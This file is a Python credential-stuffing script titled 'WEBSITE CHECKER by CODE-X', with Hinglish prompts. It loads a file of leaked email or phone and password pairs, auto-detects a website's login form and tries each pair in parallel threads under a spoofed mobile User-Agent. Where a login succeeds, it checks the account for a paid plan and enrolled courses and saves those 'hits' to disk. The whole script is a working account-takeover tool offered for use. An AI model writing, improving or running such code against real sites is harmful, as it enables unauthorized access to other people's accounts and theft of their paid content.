import requests
import os
import time
import re
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed

# ═══════════════════════════════════════════
#   WEBSITE CHECKER — CODE-X
# ═══════════════════════════════════════════

hits   = []
failed = []
total  = 0
checked = 0

def print_banner(checked=0, hits=0, failed=0, total=0):
    os.system('clear')
    print("\033[91m")
    print("  ╔══════════════════════════════════════╗")
    print("  ║     W E B S I T E  C H E C K E R    ║")
    print("  ║          by  C O D E - X             ║")
    print("  ╠══════════════════════════════════════╣")
    print(f"  ║  Total   : {str(total).ljust(6)} Checked : {str(checked).ljust(10)}║")
    print(f"  ║  ✅ Hits  : {str(hits).ljust(6)} ❌ Failed: {str(failed).ljust(10)}║")
    print("  ╚══════════════════════════════════════╝")
    print("\033[0m")

# ═══════════════════════════════════════════
#   AUTO DETECT LOGIN FORM
# ═══════════════════════════════════════════

def detect_form(url):
    try:
        session = requests.Session()
        response = session.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')

        forms = soup.find_all('form')
        username_field = None
        password_field = None
        form_action    = url

        for form in forms:
            inputs = form.find_all('input')
            for inp in inputs:
                itype = inp.get('type', '').lower()
                iname = inp.get('name', '').lower()
                iid   = inp.get('id', '').lower()

                # Password field
                if itype == 'password':
                    password_field = inp.get('name') or inp.get('id')

                # Username/email/phone field
                if itype in ['text', 'email', 'tel', 'number'] or \
                   any(x in iname for x in ['user', 'email', 'phone', 'mobile', 'login', 'number']) or \
                   any(x in iid   for x in ['user', 'email', 'phone', 'mobile', 'login', 'number']):
                    username_field = inp.get('name') or inp.get('id')

            # Form action
            action = form.get('action', '')
            if action:
                if action.startswith('http'):
                    form_action = action
                else:
                    from urllib.parse import urljoin
                    form_action = urljoin(url, action)

            if username_field and password_field:
                break

        return session, form_action, username_field, password_field

    except Exception as e:
        print(f"\033[91m[✗] Form detect error: {e}\033[0m")
        return None, url, None, None

# ═══════════════════════════════════════════
#   AUTO DETECT SUCCESS/FAIL
# ═══════════════════════════════════════════

def detect_success(before_text, after_response):
    after_text = after_response.text.lower()
    after_url  = after_response.url.lower()

    # Success signals
    success_words = [
        'dashboard', 'logout', 'log out', 'sign out', 'signout',
        'my account', 'my profile', 'welcome', 'my courses',
        'enrolled', 'profile', 'account', 'purchase', 'order'
    ]

    # Fail signals
    fail_words = [
        'invalid', 'incorrect', 'wrong', 'error', 'failed',
        'not found', 'does not exist', 'please try again',
        'invalid password', 'invalid email', 'login failed'
    ]

    for word in fail_words:
        if word in after_text:
            return False

    for word in success_words:
        if word in after_text or word in after_url:
            return True

    # URL change = likely success
    if 'login' not in after_url and 'signin' not in after_url:
        return True

    return False

# ═══════════════════════════════════════════
#   DETECT COURSES / PLAN
# ═══════════════════════════════════════════

def detect_courses(session, base_url, after_response):
    courses = []
    plan    = "Free"

    text = after_response.text.lower()
    soup = BeautifulSoup(after_response.text, 'html.parser')

    # Check plan
    paid_words = ['premium', 'pro', 'paid', 'purchased', 'enrolled', 'batch', 'buy', 'bought']
    for word in paid_words:
        if word in text:
            plan = "PAID ✅"
            break

    # Try to find courses page
    course_urls = []
    for a in soup.find_all('a', href=True):
        href = a['href'].lower()
        if any(x in href for x in ['course', 'batch', 'enrolled', 'my-course', 'dashboard']):
            from urllib.parse import urljoin
            course_urls.append(urljoin(base_url, a['href']))

    # Visit first course page
    for curl in course_urls[:2]:
        try:
            cr = session.get(curl, timeout=8)
            csoup = BeautifulSoup(cr.text, 'html.parser')

            # Find course names
            for tag in csoup.find_all(['h1','h2','h3','h4','li','div','span']):
                t = tag.get_text(strip=True)
                if 10 < len(t) < 100:
                    tl = t.lower()
                    if any(x in tl for x in ['course', 'batch', 'class', 'lecture', 'module']):
                        if t not in courses:
                            courses.append(t)
                if len(courses) >= 5:
                    break
        except:
            pass

    return plan, courses[:5]

# ═══════════════════════════════════════════
#   PARSE COMBO LINE
# ═══════════════════════════════════════════

def parse_combo(line):
    line = line.strip()
    parts = line.split(':')

    if len(parts) < 2:
        return None, None

    # email:password format
    if '@' in parts[0]:
        username = parts[0]
        password = ':'.join(parts[1:])
        return username, password

    # number:password format
    if parts[0].isdigit() and len(parts[0]) >= 8:
        username = parts[0]
        password = ':'.join(parts[1:])
        return username, password

    # fallback
    username = parts[0]
    password = ':'.join(parts[1:])
    return username, password

# ═══════════════════════════════════════════
#   CHECK ONE COMBO
# ═══════════════════════════════════════════

def check_combo(url, form_action, username_field, password_field, combo, delay):
    username, password = parse_combo(combo)
    if not username or not password:
        return "skip", combo, None, None, []

    session = requests.Session()

    try:
        # Get login page first (for cookies/csrf)
        session.get(url, timeout=10)

        data = {
            username_field: username,
            password_field: password
        }

        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
            'Referer': url
        }

        response = session.post(form_action, data=data, headers=headers, timeout=10, allow_redirects=True)

        time.sleep(delay)

        if detect_success("", response):
            plan, courses = detect_courses(session, url, response)
            return "hit", combo, plan, username, courses
        else:
            return "bad", combo, None, username, []

    except Exception as e:
        return "error", combo, None, username, []

# ═══════════════════════════════════════════
#   MAIN
# ═══════════════════════════════════════════

def main():
    global total, checked, hits, failed

    print_banner()

    print("\033[96m[*] Details Daalo:\033[0m\n")
    url        = input("  Website Login URL : ").strip()
    combo_file = input("  Combo File Path   : ").strip()
    threads    = int(input("  Threads (1-5)     : ").strip())
    delay      = float(input("  Delay (seconds)   : ").strip())

    hits_file   = "/sdcard/Download/CodeX-HITS.txt"
    failed_file = "/sdcard/Download/CodeX-FAILED.txt"

    # Auto detect form
    print("\n\033[93m[*] Login form detect ho raha hai...\033[0m")
    session, form_action, username_field, password_field = detect_form(url)

    if not username_field or not password_field:
        print("\033[91m[✗] Form auto detect nahi hua!\033[0m")
        username_field = input("  Username field name manually daalo : ").strip()
        password_field = input("  Password field name manually daalo : ").strip()
        form_action    = input("  Form action URL (Enter skip same URL) : ").strip() or url
    else:
        print(f"\033[92m[✓] Form detect hua!\033[0m")
        print(f"\033[92m    Username Field : {username_field}\033[0m")
        print(f"\033[92m    Password Field : {password_field}\033[0m")
        print(f"\033[92m    Form Action    : {form_action}\033[0m\n")

    # Load combos
    if not os.path.exists(combo_file):
        print(f"\033[91m[✗] File nahi mili: {combo_file}\033[0m")
        return

    with open(combo_file, 'r', errors='ignore') as f:
        combos = [l.strip() for l in f if ':' in l]

    total = len(combos)
    print(f"\033[93m[*] Total combos loaded: {total}\033[0m")
    print(f"\033[93m[*] Checking start...\033[0m\n")

    hit_list  = []
    fail_list = []

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {
            executor.submit(
                check_combo, url, form_action,
                username_field, password_field, combo, delay
            ): combo for combo in combos
        }

        for future in as_completed(futures):
            result, combo, plan, username, courses = future.result()
            checked += 1

            if result == "hit":
                if plan and "PAID" in plan:
                    course_str = ", ".join(courses) if courses else "N/A"
                    hit_entry = f"{combo} | Plan: {plan} | Courses: {course_str}"
                    hit_list.append(hit_entry)
                    print(f"\033[92m[✅ HIT - PAID] {combo}\033[0m")
                    print(f"\033[92m   Courses: {course_str}\033[0m")
                else:
                    print(f"\033[93m[⚠️ HIT - FREE] {combo} — Skipped\033[0m")

            elif result == "bad":
                fail_list.append(combo)
                print(f"\033[91m[❌ BAD] {combo}\033[0m")

            elif result == "skip":
                print(f"\033[93m[⚠️ SKIP] Invalid format: {combo}\033[0m")

            print_banner(checked, len(hit_list), len(fail_list), total)

            # Auto save every 5 hits
            if len(hit_list) % 5 == 0 and hit_list:
                with open(hits_file, 'w') as f:
                    f.write('\n'.join(hit_list))

    # Final save
    with open(hits_file, 'w') as f:
        f.write('\n'.join(hit_list))
    with open(failed_file, 'w') as f:
        f.write('\n'.join(fail_list))

    print("\n\033[93m")
    print("  ╔══════════════════════════════╗")
    print("  ║       FINAL RESULTS          ║")
    print(f"  ║  Total   : {str(total).ljust(18)}║")
    print(f"  ║  ✅ Hits  : {str(len(hit_list)).ljust(18)}║")
    print(f"  ║  ❌ Failed: {str(len(fail_list)).ljust(18)}║")
    print("  ╚══════════════════════════════╝\033[0m\n")
    print(f"\033[92m  Hits   → {hits_file}\033[0m")
    print(f"\033[91m  Failed → {failed_file}\033[0m\n")

main()
